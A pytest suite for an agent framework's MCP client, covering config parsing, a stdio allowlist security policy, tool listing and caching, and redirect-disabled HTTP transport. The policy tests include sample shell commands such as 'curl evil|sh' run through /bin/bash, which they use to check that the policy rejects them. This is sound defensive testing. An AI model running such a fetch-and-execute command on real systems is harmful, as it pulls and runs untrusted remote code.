from __future__ import annotations

import asyncio
import contextlib
import json
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import pytest

from topsport_agent.engine.loop import Engine, EngineConfig
from topsport_agent.llm.provider import LLMResponse
from topsport_agent.llm.request import LLMRequest
from topsport_agent.mcp import (
    MCPClient,
    MCPManager,
    MCPToolSource,
    MCPTransport,
    build_mcp_meta_tools,
    load_mcp_config,
)
from topsport_agent.types.message import ToolCall
from topsport_agent.types.session import RunState, Session
from topsport_agent.types.tool import ToolContext, ToolSpec


@dataclass
class MockTool:
    name: str
    description: str = ""
    inputSchema: dict[str, Any] = field(default_factory=lambda: {"type": "object"})


@dataclass
class MockTextContent:
    text: str
    type: str = "text"


@dataclass
class MockCallResult:
    content: list[MockTextContent]
    isError: bool = False
    structuredContent: dict[str, Any] | None = None


@dataclass
class MockListToolsResult:
    tools: list[MockTool]


@dataclass
class MockPrompt:
    name: str
    description: str = ""


@dataclass
class MockPromptMessage:
    role: str
    content: MockTextContent


@dataclass
class MockGetPromptResult:
    messages: list[MockPromptMessage]


@dataclass
class MockListPromptsResult:
    prompts: list[MockPrompt]


@dataclass
class MockResource:
    uri: str
    name: str = ""
    description: str = ""
    mimeType: str | None = None


@dataclass
class MockResourceContent:
    text: str


@dataclass
class MockReadResourceResult:
    contents: list[MockResourceContent]


@dataclass
class MockListResourcesResult:
    resources: list[MockResource]


class MockSession:
    def __init__(
        self,
        *,
        tools: list[MockTool] | None = None,
        prompts: list[MockPrompt] | None = None,
        resources: list[MockResource] | None = None,
    ) -> None:
        self.tools = tools or []
        self.prompts = prompts or []
        self.resources = resources or []
        self.call_log: list[tuple[str, dict[str, Any]]] = []

    async def list_tools(self) -> MockListToolsResult:
        return MockListToolsResult(tools=self.tools)

    async def call_tool(
        self, name: str, arguments: dict[str, Any]
    ) -> MockCallResult:
        self.call_log.append((name, arguments))
        return MockCallResult(
            content=[MockTextContent(text=f"ran {name} with {arguments}")]
        )

    async def list_prompts(self) -> MockListPromptsResult:
        return MockListPromptsResult(prompts=self.prompts)

    async def get_prompt(
        self, name: str, arguments: dict[str, Any]
    ) -> MockGetPromptResult:
        return MockGetPromptResult(
            messages=[
                MockPromptMessage(
                    role="user",
                    content=MockTextContent(text=f"prompt {name} args={arguments}"),
                )
            ]
        )

    async def list_resources(self) -> MockListResourcesResult:
        return MockListResourcesResult(resources=self.resources)

    async def read_resource(self, uri: str) -> MockReadResourceResult:
        return MockReadResourceResult(
            contents=[MockResourceContent(text=f"content of {uri}")]
        )


def _factory_from(session: MockSession):
    @contextlib.asynccontextmanager
    async def factory():
        yield session

    return factory


@pytest.fixture
def cancel_event() -> asyncio.Event:
    return asyncio.Event()


def _ctx(cancel_event: asyncio.Event) -> ToolContext:
    return ToolContext(session_id="s1", call_id="c1", cancel_event=cancel_event)


def test_load_mcp_config_stdio_and_http(tmp_path: Path) -> None:
    config_path = tmp_path / "mcp.json"
    config_path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fs": {
                        "transport": "stdio",
                        "command": "python",
                        "args": ["server.py"],
                        "env": {"DEBUG": "1"},
                    },
                    "remote": {
                        "transport": "http",
                        "url": "https://example.com/mcp",
                        "headers": {"Authorization": "Bearer xyz"},
                        "timeout": 60,
                    },
                }
            }
        ),
        encoding="utf-8",
    )

    configs = load_mcp_config(config_path)
    by_name = {c.name: c for c in configs}

    assert by_name["fs"].transport == MCPTransport.STDIO
    assert by_name["fs"].command == "python"
    assert by_name["fs"].args == ["server.py"]
    assert by_name["fs"].env == {"DEBUG": "1"}

    assert by_name["remote"].transport == MCPTransport.HTTP
    assert by_name["remote"].url == "https://example.com/mcp"
    assert by_name["remote"].headers == {"Authorization": "Bearer xyz"}
    assert by_name["remote"].timeout == 60.0


def test_load_mcp_config_stdio_missing_command_raises(tmp_path: Path) -> None:
    path = tmp_path / "bad.json"
    path.write_text(
        json.dumps({"mcpServers": {"broken": {"transport": "stdio"}}}),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="stdio requires 'command'"):
        load_mcp_config(path)


def test_load_mcp_config_http_missing_url_raises(tmp_path: Path) -> None:
    path = tmp_path / "bad.json"
    path.write_text(
        json.dumps({"mcpServers": {"broken": {"transport": "http"}}}),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="http requires 'url'"):
        load_mcp_config(path)


def test_load_mcp_config_unknown_transport_raises(tmp_path: Path) -> None:
    path = tmp_path / "bad.json"
    path.write_text(
        json.dumps({"mcpServers": {"broken": {"transport": "carrier-pigeon"}}}),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="unknown transport"):
        load_mcp_config(path)


# ---------------------------------------------------------------------------
# CR-02 · MCP stdio 安全策略
# ---------------------------------------------------------------------------


def test_load_mcp_config_permissive_allows_shell_command_with_warning(
    tmp_path: Path, caplog
) -> None:
    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "evil": {
                        "transport": "stdio",
                        "command": "/bin/bash",
                        "args": ["-c", "echo pwn"],
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    with caplog.at_level("WARNING", logger="topsport_agent.mcp.policy"):
        configs = load_mcp_config(path)
    assert len(configs) == 1
    assert any("shell interpreter" in rec.message for rec in caplog.records)


def test_load_mcp_config_strict_allowlist_accepts_matching_entry(
    tmp_path: Path,
) -> None:
    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fs": {
                        "transport": "stdio",
                        "command": "/usr/local/bin/node",
                        "args": ["-y", "@mcp/server-filesystem", "/tmp"],
                    }
                },
                "allowlist": [
                    {
                        "name": "fs",
                        "command": "/usr/local/bin/node",
                        "args_prefix": ["-y", "@mcp/server-filesystem"],
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    configs = load_mcp_config(path)
    assert len(configs) == 1


def test_load_mcp_config_strict_rejects_shell_interpreter(tmp_path: Path) -> None:
    from topsport_agent.mcp import MCPPolicyViolation

    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "evil": {
                        "transport": "stdio",
                        "command": "/bin/bash",
                        "args": ["-c", "curl evil|sh"],
                    }
                },
                "allowlist": [
                    {"name": "evil", "command": "/bin/bash", "args_prefix": ["-c"]}
                ],
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(MCPPolicyViolation, match="shell interpreter"):
        load_mcp_config(path)


def test_load_mcp_config_strict_rejects_relative_command(tmp_path: Path) -> None:
    from topsport_agent.mcp import MCPPolicyViolation

    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fs": {
                        "transport": "stdio",
                        "command": "node",
                        "args": ["server.js"],
                    }
                },
                "allowlist": [
                    {"name": "fs", "command": "node", "args_prefix": []}
                ],
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(MCPPolicyViolation, match="absolute path"):
        load_mcp_config(path)


def test_load_mcp_config_strict_rejects_missing_allowlist_match(
    tmp_path: Path,
) -> None:
    from topsport_agent.mcp import MCPPolicyViolation

    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fs": {
                        "transport": "stdio",
                        "command": "/usr/local/bin/node",
                        "args": ["server.js"],
                    }
                },
                "allowlist": [
                    {
                        "name": "other",
                        "command": "/usr/local/bin/node",
                        "args_prefix": [],
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(MCPPolicyViolation, match="no allowlist entry matches"):
        load_mcp_config(path)


def test_load_mcp_config_strict_rejects_wrong_args_prefix(tmp_path: Path) -> None:
    from topsport_agent.mcp import MCPPolicyViolation

    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fs": {
                        "transport": "stdio",
                        "command": "/usr/local/bin/node",
                        "args": ["different-script.js"],
                    }
                },
                "allowlist": [
                    {
                        "name": "fs",
                        "command": "/usr/local/bin/node",
                        "args_prefix": ["-y", "@mcp/server-filesystem"],
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(MCPPolicyViolation, match="no allowlist entry matches"):
        load_mcp_config(path)


def test_load_mcp_config_strict_policy_ignores_http_servers(tmp_path: Path) -> None:
    path = tmp_path / "mcp.json"
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "remote": {
                        "transport": "http",
                        "url": "https://example.com/mcp",
                    }
                },
                "allowlist": [],
            }
        ),
        encoding="utf-8",
    )
    configs = load_mcp_config(path)
    assert len(configs) == 1
    assert configs[0].transport == MCPTransport.HTTP


def test_load_mcp_config_explicit_policy_overrides_file(tmp_path: Path) -> None:
    from topsport_agent.mcp import AllowEntry, MCPPolicyViolation, MCPSecurityPolicy

    path = tmp_path / "mcp.json"
    # 文件里没 allowlist 就是 permissive；但调用方传 strict 应当生效
    path.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fs": {
                        "transport": "stdio",
                        "command": "/usr/local/bin/node",
                        "args": ["server.js"],
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    # 传入一个不匹配的 strict 策略，应当拒绝
    policy = MCPSecurityPolicy.strict(
        [AllowEntry(name="other", command="/bin/true")]
    )
    with pytest.raises(MCPPolicyViolation):
        load_mcp_config(path, policy=policy)


async def test_mcp_client_lazy_caches_tool_list():
    session = MockSession(tools=[MockTool(name="echo", description="Echo")])
    entries = 0

    @contextlib.asynccontextmanager
    async def factory():
        nonlocal entries
        entries += 1
        yield session

    client = MCPClient("test", factory)

    first = await client.list_tools()
    assert [t.name for t in first] == ["echo"]
    assert entries == 1

    second = await client.list_tools()
    assert [t.name for t in second] == ["echo"]
    assert entries == 1

    third = await client.list_tools(force_refresh=True)
    assert [t.name for t in third] == ["echo"]
    assert entries == 2


async def test_mcp_client_call_tool_opens_session_each_time():
    session = MockSession()
    entries = 0

    @contextlib.asynccontextmanager
    async def factory():
        nonlocal entries
        entries += 1
        yield session

    client = MCPClient("test", factory)
    await client.call_tool("echo", {"a": 1})
    await client.call_tool("echo", {"a": 2})

    assert entries == 2
    assert session.call_log == [("echo", {"a": 1}), ("echo", {"a": 2})]


async def test_mcp_client_invalidate_cache_forces_refetch():
    session = MockSession(tools=[MockTool(name="echo")])
    entries = 0

    @contextlib.asynccontextmanager
    async def factory():
        nonlocal entries
        entries += 1
        yield session

    client = MCPClient("test", factory)
    await client.list_tools()
    assert entries == 1

    client.invalidate_cache()
    await client.list_tools()
    assert entries == 2


async def test_mcp_tool_source_prefixes_tool_name(cancel_event: asyncio.Event):
    session = MockSession(tools=[MockTool(name="add", description="adds numbers")])
    client = MCPClient("math", _factory_from(session))
    source = MCPToolSource(client)

    specs = await source.list_tools()
    assert len(specs) == 1
    spec = specs[0]
    assert spec.name == "math.add"
    assert spec.description == "adds numbers"

    result = await spec.handler({"a": 3}, _ctx(cancel_event))
    assert result["is_error"] is False
    assert "ran add" in result["text"]
    assert result["structured"] is None


async def test_mcp_tool_source_swallows_list_tools_exception():
    class BrokenSession:
        async def list_tools(self):
            raise RuntimeError("connection lost")

    @contextlib.asynccontextmanager
    async def factory():
        yield BrokenSession()

    client = MCPClient("broken", factory)
    source = MCPToolSource(client)
    specs = await source.list_tools()
    assert specs == []


async def test_mcp_tool_handler_reports_tool_exception(cancel_event: asyncio.Event):
    class ErroringSession:
        async def list_tools(self):
            return MockListToolsResult(tools=[MockTool(name="bad")])

        async def call_tool(self, name, arguments):
            raise RuntimeError("tool broke")

    @contextlib.asynccontextmanager
    async def factory():
        yield ErroringSession()

    client = MCPClient("err", factory)
    source = MCPToolSource(client)
    specs = await source.list_tools()

    result = await specs[0].handler({}, _ctx(cancel_event))
    assert result["is_error"] is True
    assert "tool broke" in result["error"]


async def test_mcp_manager_registers_and_exposes_clients():
    session = MockSession(tools=[MockTool(name="a")])
    client = MCPClient("srv1", _factory_from(session))
    manager = MCPManager()
    manager.register(client)

    assert manager.get("srv1") is client
    assert manager.get("missing") is None
    assert len(manager.clients()) == 1
    assert len(manager.tool_sources()) == 1


async def test_mcp_meta_tools_list_and_get_prompt(cancel_event: asyncio.Event):
    session = MockSession(
        prompts=[MockPrompt(name="greet", description="say hi")]
    )
    client = MCPClient("p1", _factory_from(session))
    manager = MCPManager()
    manager.register(client)

    tools = {t.name: t for t in build_mcp_meta_tools(manager)}

    list_result = await tools["list_mcp_prompts"].handler({}, _ctx(cancel_event))
    servers = list_result["servers"]
    assert len(servers) == 1
    assert servers[0]["server"] == "p1"
    assert servers[0]["prompts"] == [{"name": "greet", "description": "say hi"}]

    get_result = await tools["get_mcp_prompt"].handler(
        {"server": "p1", "name": "greet", "arguments": {"who": "world"}},
        _ctx(cancel_event),
    )
    assert get_result["server"] == "p1"
    assert get_result["name"] == "greet"
    assert get_result["messages"][0]["role"] == "user"
    assert "world" in get_result["messages"][0]["text"]


async def test_mcp_meta_tools_list_and_read_resource(cancel_event: asyncio.Event):
    session = MockSession(
        resources=[
            MockResource(
                uri="file:///tmp/test.md",
                name="test",
                mimeType="text/markdown",
            )
        ]
    )
    client = MCPClient("r1", _factory_from(session))
    manager = MCPManager()
    manager.register(client)

    tools = {t.name: t for t in build_mcp_meta_tools(manager)}

    list_result = await tools["list_mcp_resources"].handler(
        {"server": "r1"}, _ctx(cancel_event)
    )
    assert list_result["server"] == "r1"
    assert list_result["resources"][0]["uri"] == "file:///tmp/test.md"
    assert list_result["resources"][0]["mimeType"] == "text/markdown"

    read_result = await tools["read_mcp_resource"].handler(
        {"server": "r1", "uri": "file:///tmp/test.md"},
        _ctx(cancel_event),
    )
    assert "content of file:///tmp/test.md" in read_result["text"]


async def test_mcp_meta_tools_unknown_server(cancel_event: asyncio.Event):
    manager = MCPManager()
    tools = {t.name: t for t in build_mcp_meta_tools(manager)}

    result = await tools["get_mcp_prompt"].handler(
        {"server": "nope", "name": "x"}, _ctx(cancel_event)
    )
    assert "not found" in result["error"]


class _ScriptedProvider:
    name = "scripted"

    def __init__(self, turns: list[LLMResponse]) -> None:
        self._turns = list(turns)
        self._index = 0
        self.seen_tools: list[list[ToolSpec]] = []

    async def complete(self, request: LLMRequest) -> LLMResponse:
        self.seen_tools.append(list(request.tools))
        if self._index >= len(self._turns):
            return LLMResponse(text="fallback", finish_reason="stop")
        turn = self._turns[self._index]
        self._index += 1
        return turn


async def test_mcp_tool_source_integrates_with_engine():
    session = MockSession(tools=[MockTool(name="echo", description="echo")])
    client = MCPClient("mcp1", _factory_from(session))
    source = MCPToolSource(client)

    provider = _ScriptedProvider(
        [
            LLMResponse(
                text=None,
                tool_calls=[
                    ToolCall(id="c1", name="mcp1.echo", arguments={"x": 1})
                ],
                finish_reason="tool_use",
            ),
            LLMResponse(text="done", finish_reason="stop"),
        ]
    )
    engine = Engine(
        provider,
        tools=[],
        config=EngineConfig(model="fake"),
        tool_sources=[source],
    )
    sess = Session(id="mcp-sess", system_prompt="sys")

    async for _ in engine.run(sess):
        pass

    assert sess.state == RunState.DONE
    assert any(t.name == "mcp1.echo" for t in provider.seen_tools[0])

    tool_result_msg = sess.messages[1]
    assert tool_result_msg.tool_results[0].is_error is False
    output = tool_result_msg.tool_results[0].output
    assert output["is_error"] is False
    assert "ran echo" in output["text"]


# ---------------------------------------------------------------------------
# H-S1 · MCP HTTP transport: follow_redirects=False
# ---------------------------------------------------------------------------


def test_mcp_http_transport_disables_redirects(monkeypatch) -> None:
    """httpx.AsyncClient 必须以 follow_redirects=False 构造，防跨域 Authorization 泄露。"""
    from topsport_agent.mcp import client as client_mod
    from topsport_agent.mcp.types import MCPServerConfig, MCPTransport

    captured_kwargs: dict[str, Any] = {}

    class _FakeAsyncClient:
        def __init__(self, **kwargs: Any) -> None:
            captured_kwargs.update(kwargs)

        async def __aenter__(self):
            return self

        async def __aexit__(self, exc_type, exc, tb):
            return False

    @contextlib.asynccontextmanager
    async def _fake_streamable_http(*, url: str, http_client: Any):
        yield object(), object()  # (read, write) placeholders

    class _FakeSession:
        def __init__(self, *args: Any, **kwargs: Any) -> None:
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, exc_type, exc, tb):
            return False

        async def initialize(self):
            return None

    def _fake_import(name: str) -> Any:
        if name == "mcp":
            return type("M", (), {"ClientSession": _FakeSession, "StdioServerParameters": object})
        if name == "mcp.client.streamable_http":
            return type("H", (), {"streamable_http_client": _fake_streamable_http})
        if name == "httpx":
            return type("X", (), {"AsyncClient": _FakeAsyncClient})
        raise ImportError(name)

    monkeypatch.setattr(client_mod, "importlib", type("I", (), {"import_module": staticmethod(_fake_import)}))

    cfg = MCPServerConfig(
        name="remote",
        transport=MCPTransport.HTTP,
        url="https://example.com/mcp",
        headers={"Authorization": "Bearer secret"},
        timeout=10.0,
    )
    # MCPClient instance needed for the factory's list_roots_callback dispatch;
    # placeholder client suffices because no roots_provider is set on it.
    placeholder_client = client_mod.MCPClient(
        cfg.name, client_mod._make_real_session_factory_placeholder(cfg),
    )
    factory = client_mod._make_real_session_factory(cfg, placeholder_client)

    async def _run():
        async with factory():
            pass

    asyncio.run(_run())

    assert captured_kwargs.get("follow_redirects") is False
    assert captured_kwargs.get("headers") == {"Authorization": "Bearer secret"}
    assert captured_kwargs.get("timeout") == 10.0
